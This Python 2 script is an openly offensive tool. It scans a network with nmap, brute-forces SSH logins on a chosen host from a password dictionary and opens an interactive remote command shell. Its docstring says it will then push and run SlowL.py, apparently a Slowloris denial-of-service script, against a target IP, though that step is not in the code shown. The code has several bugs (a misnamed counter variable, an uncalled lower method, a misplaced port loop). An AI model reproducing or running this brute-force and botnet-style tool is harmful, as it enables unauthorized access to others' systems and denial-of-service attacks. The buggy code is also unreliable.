'''

This script will do nmap scanning for hosts and open ports
Then will give you an option to attack which host from the avaliable hosts
Once host is selected, brute force attack will be done to get access of the others system
Then the script shall transfer SlowL.py file 
Then execute the file with target IP address

'''


import nmap
from pexpect import pxssh
import time
import sys


## Scan network for avaliable hosts and open ports

def nmap_scan(network):

    print("Scanning for avaliable hosts in the network..")

    nm = nmap.PortScanner()

    nm.scan(network, '20-1024')

    for host in nm.all_hosts():
        print("-----------------------------------------------------")
        print("Hosts: %s (%s)" %(host, nm[host].hostname()))
        print("State: %s" % nm[host].state())

    for proto in nm[host].all_protocols():
        print("---------------------------------")
        print("Protocol: %s" %proto)

        open_ports = nm[host][proto].keys()
        open_ports.sort()

        for port in open_ports:
            print("port: %s\t state : %s" %(port, nm[host][proto][port]['state']))


# SSH and connect to the desired host

def connect(host, user, password):
    fails =0

    try:
        s = pxssh.pxssh()
        s.force_password= True                   # Don't go for private-public key verification, ask for password
        s.login(host, user, password)
        print 'Password found ' + password
        return s

    except Exception, e:
        if fails > 5:
            print 'Too many socket timeouts '
            exit(0)

        elif 'read_nonblocking' in str(e):
            fail += 1
            time.sleep(5)
            return connect(host, user, password)

        elif 'synchronizw with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, password)
        return None


## Simple method to get console inputs
def get_input(msg):

    sys.stdout.write(msg)
    sys.stdout.flush()
    return sys.stdin.readline()



def Main():

    network = sys.argv[1]
    dt = sys.argv[2]
    nmap_scan(network)

    host = get_input("Select IP address you want as an agent: ")
    print("You have selected agent as %s " %host)

    user = get_input("Enter the username of the agent: ")

    if dt:
        with open(dt, 'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print 'Testing -> ' + str(password)
                conn = connect(host, user, password)
                if conn:
                    print '[SSH connected, Issue commands Q or q for quiting!]'
                    command = raw_input('>')
                    while command.lower != 'q':
                        conn.sendline(command)
                        conn.prompt()
                        print conn.before
                        command = raw_input('>')
    else:
        print "No dict found. Error"
        exit(0)



if __name__ == '__main__':
    Main()


